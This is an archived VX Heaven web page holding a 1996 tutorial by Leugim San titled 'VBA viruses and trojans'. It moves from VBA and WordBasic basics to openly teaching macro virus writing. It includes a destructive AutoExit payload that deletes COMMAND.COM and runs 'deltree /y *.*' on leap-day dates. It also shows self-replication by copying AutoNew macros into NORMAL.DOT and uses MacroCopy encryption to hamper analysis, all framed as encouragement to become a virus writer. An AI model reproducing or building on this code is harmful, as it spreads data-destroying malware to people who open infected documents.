<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Leugim San 'VBA viruses and trojans' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Leugim San"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Leugim San,VBA viruses and trojans, function, macro, infect, case, procedures, arguments, objects, document, make, virus, syntax, check, activates, winword, font"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"79b8af17c0057e500a69ef6f5e3d52c02d8206ce-1498757398-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vls01.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>VBA viruses and trojans</h1><p><a href="/lib/?lang=en&amp;author=Leugim%20San"> Leugim San</a><br/> <em> 1996</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vls01.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vls01">Back to index</a>] [<a href="/lib/vls01.html#disqus_thread">Comments</a>]<br/> 
<p>A macro is a program written in a certain language which is used usually for automatizing some processes inside an application. In this case, we will talk about Visual Basic for Applications (VBA) and WordBasic (WB), which are the languages used by Microsoft and all their programs; thus, Excel, Project and PowerPoint use VBA, and WinWord uses WB.</p>
<p>From now we will speak about VBA as a general language, because it's the attempt to unify a macro language, common for all the Microsoft programs. Anyway, WordBasic has still some characteristics which make that, someti- mes, we reffer specifically to it.</p>
<p>There are some differences between the syntax of these two languages, but the coding structure is the same, so, if we don't make any specification, we'll speak about VBA, as the common Microsoft macro language.</p>
<p>The VBA macros are called procedures; there are two kinds of procedures:</p>
<ul>
<li>Sub procedures</li>
<li>Function procedures</li>
</ul>
<p>The sub procedures may be executed directly or being called from other macro. The syntax for these procedures is the following:</p>
<pre class="source">
Sub &lt;:macro_name>
-> write here the macro code &lt;:-
' the comments are preceded by an apostrophe
End Sub
</pre>
<p>Example: </p>
<pre class="source">
Sub Stupid_Greeting
' This macro opens a dialog box and displays a message
MsgBox "Hello World!"
End Sub
</pre>
<p>The function procedures (aka functions) return a value, which may be passed as a parameter for other VBA procedure. This is its syntax:</p>
<pre class="source">
Function &lt;:function_name>(arguments)
-> Instructions &lt;:-
' Commentaries
End Function
</pre>
<p>Example:</p>
<pre class="source">
Function AddAB(a,b)
' This adds the parameters a and b and returns the result
' in "AddAB"
AddAB = a+b
End Function
</pre>
<p>Of course, you can insert in a document as many macros as you need or want, there's no limit. Now that you've understood what a joint of macros is, we'll call it VBA module. This means that a VBA module is a joint of macros (sub and function procedures) which make up an Office document.</p>
<p>The VBA language also works with objects; we can make references to other documents, graphics... inside the VBA modules. Objects have properties. For instance, the background color of an object is a property (aka attribute). Objects also have 'methods', which are the operations we can make with them (with the objects).</p>
<p>VBA allows us to work with variables, and, as a structured programming language, it has the typical constructions of other languages:</p>
<p>'For-next' bucles:</p>
<pre class="source">
Sub Counter
Infect_Num=0
For Count=1 to 10
Infect_Num=Infect_Num+Count
Next Count
MsgBox "I reached the maximum infection number"
End Sub
</pre>
<p>'If-then' conditions:</p>
<pre class="source">
Sub Infect_Check
If Infect_Num=0 Then MsgBox "File not infected"
End Sub
</pre>
<p>'With-end with' constructions (used for working with several properties of a certain object):</p>
<pre class="source">
Sub ChangeProperties
With Selection
.Font.Bold=True
.Font.ColorIndex=3 ' Red color
End With
End Sub
</pre>
<p>'Select case-end select' constructions:</p>
<pre class="source">
Sub Check_Infection
Select Case Infect_Num
Case 0
MsgBox "File not infected"
Case is > 0
MsgBox "File infected"
Case is &lt;: 0
Infect_Num=0
End Case
End Sub
</pre>
<p>A very useful tool for working with the VBA language is the debuggin window. With it we can trace code, make corrections, and so on... one debugging technique consists on using flags for halting for a moment the code execution with a MsgBox after each instruction, so we can analyze the contents of certain variables and/or instructions (albeit the VBA debugger is able to set break points for halting the code execution, too).</p>
<p>Something very important, apart of this, are the arguments of a function procedure; as we've just seen, the structure of a VBA procedure is this:</p>
<pre class="source">
Function &lt;:name>(arguments)
[...]
End Function
</pre>
<p>These arguments may be constants, variables, or expressions. Anway, there are procedures which don't need any arguments:</p>
<pre class="source">
Function Get_Name()
Name=Application.UserName
End Function
</pre>
<p>There are function procedures which always have a fixed argument number (up to 60). Other functions have some fixed arguments and other optional.</p>
<p>Ok, and once the basics of VBA are clear for everybody, we can start learning something about the thing we're about to study: VBA viruses and trojans :-)</p>
<p>The VBA language is very versatile, and this is basically due to two reasons: the first of them is its big facility of learning and use; as it's a high level language orientated to events (not to objects :) it's very easy to create complex modules without spending many time on it. The second reason is the extra large number of predefined functions it has, which make things much easier for us. We could even say a third reason, but it's really included in the previous one... and it's that we can use functions (or macros) of *automatic_execution*, so we can simulate some thingies which make eeeeven easier to write routines as autocopying, memory residency, etc), used by the 'normal' DOS viruses.</p>
<p>Besides this, VBA has, as an exclusive feature, the PORTABILITY property, advantage, or however you wanna call it. VBA worxor under Windows 3.x, Windows95, WindowsNT, Macintosh, etc. this is: in every enviroment or OS in which we can run any version of the applications which support VBA.</p>
<p>But don't expect so many facilities... :-)</p>
<p>VBA is a language which adapts to the language of the application under it's running. This means that, if we have the spanish version of WinWord, the names of the predefined functions will be in spanish, so the two next macros will NOT be the same (the first one is written in spanish, and the second one, in english):</p>
<p>First macro (spanish):</p>
<pre class="source">
Sub Demo_Macro
Con Selecci¢n.Fuente
.Nombre="Arial"
Fin Con
End Sub
</pre>
<p>Second macro (english):</p>
<pre class="source">
Sub Demo_Macro
With Selection.Font
.Name="Arial"
End With
End Sub
</pre>
<p>This last macro would NOT work under our spanish version of WinWord... it would force a macro execution error, so it wouldn't do anything. And remember that VBA is an interpreted language (not compiled) so every execution error appears 'on the fly'.</p>
<p>But... doesn't this have any solution? ... ... ... ... }:-) ... Sure! ;-) There are some functions, common to all the VBA versions, without depen- ding on the language. For instance... the automatic macro AutoExec (which is executed when loading WinWord if it's stored in a template called NORMAL.DOT) would work under every VBA version.</p>
<p>Maybe one of the first exercises we should do would be trying to write a multiplatform and multilanguage virus... but maybe it already exists... }:-) hehe... but let's go on with the tutorial.</p>
<p>The next step, once we've analyzed the language syntax, we have to study the functions we need to use in our viruses. As this ain't a text about programming in general but a macro virus tutorial, we'll focus our attention to the automatic macros used by WinWord, implemented in WordBasic (but note: NOT in VBA).</p>
<p>There are five special macros which execute automatically and which we'll have to care about:</p>
<dl>
<dt>AutoExec</dt><dd>it's a macro which activates when loading the text processor, but only when it's stored in the template NORMAL.DOT or in the default application directory</dd>
<dt>AutoNew</dt><dd>it activates when creating a new document</dd>
<dt>AutoOpen</dt><dd>it activates when opening an existing document</dd>
<dt>AutoClose</dt><dd>it activates when closing a document</dd>
<dt>AutoExit</dt><dd>it activates when exiting the text processor</dd>
</dl>
<p>For proving the potence and the versatility of these macros, we can have a look at the following code (by now we won't care about the language):</p>
<pre class="source">
' Save this macro as AutoExit
Sub Main
If Application.Username &lt;:> "MaD_MoTHeR" Then
' We check the registration name of the application
SetAttr "C:\COMMAND.COM",0
' Wipe the attributes of COMMAND.COM
Open "C:\COMMAND.COM" for Output as #1
' We open it for checking if it activates any error flag
Close #1
' It exists, ok... let's close it...
Kill "C:\COMMAND.COM"
' ... and kill it }:-)
End If
If Month(Now())=2 Then
' System date -> month=february (2)?
If Day(Now())=29 Then
' february 29th? (only one time each four years) :-)
Shell "deltree /y *.* > null"
' Btw... /y works for all the languages :-)
End If
End If
End Sub
</pre>
<p>The macro above will check two things on exiting from WinWord: if the registration name is equal to MaD_MoTHeR, it will delete COMMAND.COM; and if the system date is equal to february 29th (only for leap years) :-) it will do a deltree /y *.* > null, and i guess you all know what does this DOS command do, right? };-)</p>
<p>Ok, now you're supposed to have a big enough knowledge to face the next and last chapter of this tutorial: replication. It's the most important thing for writing viruses, don't you think? :-)</p>
<p>The unique thing we must know is how can we adapt an automatic macro (this is the simplest example) in order to install it in the template which is opened by default by WinWord. This is done by following the next steps... first, define a variable which stores the complete macro name:</p>
<pre class="source">
name$ = WindowName$() + ":AutoNew" ' This macro will be executed
' every time a new document is
' created
</pre>
<p>And then, all our work is to write it into the template NORMAL.DOT with this simple instruction:</p>
<pre class="source">
MacroCopy name$, "Global:AutoNew"
</pre>
<p>Quite easy, isn't it? :-) Anyway, this is the general way in which macro viruses work, but there are lots of cooler ways to infect... all it takes is a little bit of imagination and additional code. One of these things which make your viruses cooler and difficult their analysis is the macro encryption... and it's easier than the replication!!! :-)</p>
<pre class="source">
MacroCopy "MyTemplate:MyMacro", "Global:AutoClose", 1
</pre>
<p>If you execute the MacroCopy function passing 1 (or any other number unless 0) as parameter, the result of the copy will be an only executable macro, so we won't be able to edit it! :-)</p>
<p>And this is all you need for becoming a macro virus writer... practice, research, and try to write something really original. Btw, there's a virus sample i wrote included in '29A virii'. It's a supertiny and super- simple macro infector which contains a little payload :-) Don't forget to have a look at it!</p>
[<a style="" href="/lib/?lang=EN&amp;index=MA#vls01">Back to index</a>] [<a href="/lib/vls01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vls01">de</a><a href="/lib/index.php?lang=en&amp;id=vls01">en</a><a href="/lib/index.php?lang=es&amp;id=vls01">es</a><a href="/lib/index.php?lang=it&amp;id=vls01">it</a><a href="/lib/index.php?lang=fr&amp;id=vls01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vls01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vls01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vls01">ua</a></div>
</body>
</html>
